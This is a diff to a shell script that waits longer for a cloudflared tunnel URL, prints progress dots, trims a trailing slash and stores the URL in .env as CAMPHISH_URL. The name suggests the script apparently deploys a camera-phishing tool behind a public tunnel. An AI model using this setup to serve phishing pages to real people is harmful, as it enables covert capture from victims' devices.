@@ -91,12 +91,14 @@ if [ "$TUNNEL" = "cloudflared" ]; then
         > "$TUNNEL_LOG" 2>&1 &
     TUNNEL_PID=$!
 
-    echo -n "  Waiting for tunnel URL..."
-    for i in $(seq 1 60); do
-        TUNNEL_URL=$(grep -oE 'https://[a-z0-9-]+\.[a-z0-9-]+\.(try\.cloudflare\.com|cf)' < "$TUNNEL_LOG" | tail -1)
+    echo -n "  Waiting for tunnel URL"
+    for i in $(seq 1 90); do
+        TUNNEL_URL=$(grep -oE 'https://[a-z0-9-]+\.[a-z0-9-]+\.(try\.cloudflare\.com|cf)' < "$TUNNEL_LOG" | tail -1) || true
         [ -n "$TUNNEL_URL" ] && break
+        echo -n "."
         sleep 2
     done
+    echo ""
 
     if [ -z "$TUNNEL_URL" ]; then
         echo " failed"
@@ -118,6 +120,7 @@ fi
 if [ -n "$TUNNEL_URL" ]; then
     echo "[3/5] Restarting backend with tunnel URL..."
 
+    TUNNEL_URL="${TUNNEL_URL%/}"
     if grep -q "^CAMPHISH_URL=" .env 2>/dev/null; then
         sed -i '' "s|^CAMPHISH_URL=.*|CAMPHISH_URL=$TUNNEL_URL|" .env
     else
